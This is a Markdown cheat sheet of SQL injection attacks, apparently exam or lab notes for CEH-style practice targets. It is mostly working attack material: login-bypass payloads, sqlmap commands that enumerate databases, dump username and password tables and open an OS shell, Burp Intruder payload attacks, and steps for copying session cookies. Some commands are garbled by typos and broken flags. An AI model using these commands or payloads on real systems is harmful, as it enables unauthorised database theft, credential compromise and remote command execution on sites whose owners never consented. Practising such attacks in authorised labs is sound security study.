#### Important
```bash
sqlmap -u <url with id parameter> -D databasename -T flag --dump
```
#### Basic SQL Paylods
```bash
` OR 1=1--
' OR '1'='1' --
‘ or 1=1 -- for login bypass
admin' --
admin' #
admin'/*
' or 1=1--
' or 1=1#
' or 1=1/*
') or '1'='1--
') or ('1'='1—
```
#### default yes
```bash
--batch
```
#### OS Shell
```bash
For OS shell this is the command-   sqlmap -u "http://www.xyz.com/profile.aspx?id=1" --cookie="[cookie value that you copied and don't remove square brackets]" --os-shell
TASKLIST  (to view the tasks)
systeminfo
uname -a
```
#### with  Burpsuite file
```bash
interception on -> http -> raw -> right click and save
sqlmap -r req.txt --dbs
sqlmap -r req.txt -D <> --tables
sqlmap -r req.txt -D <> -T <> --columns

```
#### SQL Injection without Login credentials
```bash
visit cybersec.cehorg.com website > scroll down to bottom > there you can see blog hyperlink > click on it > you can observe that the url was chaged with id parameter > copy the url.
sqlmap -u <url with id parameter> --dbs
sqlmap -u <url with id parameter> -D databasename --tables 
sqlmap -u <url with id parameter> -D databasename -T flag --dump

or
-> wapiti -u http://172.20.0.22/
-> click on every menu on website, check if u find anything likd id=10
-> Use gobuster
-> Spider the site -> OWASP ZAP
-> View page source 
```

#### Quick
```bash
Click on View Profile > Copy the Url (save it in notepad) > Right click > Inspect element > console > document.cookie
```
#### SQL Injection
```bash

for cookie
inspect-> document.cookie

to list databases
sqlmap -u "http://cinema.cehorg.com/search.php?q=test" --cookie="<id>" --dbs
or
if u can't find any parameters
add --crawl 1/2/3 -> prefer 3
--batch -> select by default options
sqlmap -u <url> --crawl 3 --batch 
list tables
--tables
list columns
--columns
dump
sqlmap -u "http://cinema.cehorg.com/search.php?q=test" --cookie="<id>" -D database_name -T users -C username,password --dump

SAMPLE
sqlmap -u "http://10.49.180.48/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie="PHPSESSID=kbckghh848v8v2cmj58madcp17; security=low" --dbs
sqlmap -u "http://10.49.173.66/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie="PHPSESSID=co2jiqu4risrfcm7mdrts9v1t5; security=low" -D dvwa -T users -C user,password --dump
```
#### SQL Injection if credintials already givem
```bash
login with credentials and copy url and cookies
sqlmap -u "http://target/page.php?id=1" --cookie="PHPSESSID=xxxxxxxx" --dbs
```

#### SQLMap with Crawl, Level, Risk Parameters
```bash
sqlmap -u "http://192.168.44.40" --crawl=3 --level=5 --risk=3 --dbs 
 "http://192.168.44.40"   Specifies the URL of the vulnerable web application. 
 -crawl=3  Crawls the website up to depth 3 to discover additional parameters and pages vulnerable to SQL injection. 
 -level=5  Sets the level of tests to perform. Higher levels test more thoroughly. 
 -risk=3  Sets the risk of tests to perform. Higher risks test more aggressively.

List tables
qlmap -u "http://192.168.44.40" --crawl=3 --level=5 --risk=3 -D database_name - -tables

List columns
sqlmap -u "http://192.168.44.40" --crawl=3 --level=5 --risk=3 -D database_name - 
T table_name --columns

dump column
sqlmap -u "http://192.168.44.40" --crawl=3 --level=5 --risk=3 -D database_name - 
T table_name -C Flag --dump 
```
#### Sample
```bash
use SQLMap and a vulnerable url on the website to dump user info.
Get all databases using sqlmap
sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1 --dbs
Get tables from a selected database_name
sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1 -D database_name --tables 
Get all columns from a selected table_name in the database_name
sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1 -D database_name -T table_name --columns
Dump the data from the columns 
sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1 -D database_name -T table_name -C column_name --dump
```
#### BurpSuite
```bash
enter some random value at username and password field
capture in burpsuite
add $ to username
right click and send it to intruder
sniper attack
browser -> sql injection payloads -> copy and paste
Link for payloads : https://github.com/payload-box/sql-injection-payload-list
start attack
check for 200 code
check response
u can see token
go to decoder-> base64 -> text-> u will get a code
crack the hash and u will get password-> use chatgpt to crack

```
#### Sample
```bash
1. now in parrot os, open firefox and login into the website given and details. 
2. Go to profile and and right cleck and inspect and console type “document.cookie” you will get one value. 
3. Open the terminal and type the below commands to get the password of other user. 
4. sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="mscope=1jwuydl=;" –-dbs 
5. sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="mscope=1jwuydl=; ui-tabs-1=0" -D moveiscope – -tables 
6. sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="mscope=1jwuydl=; ui-tabs-1=0" -D moviescope -T user-Login – -dump 
7. You will get all the Useraname and Passwords of the website.
```
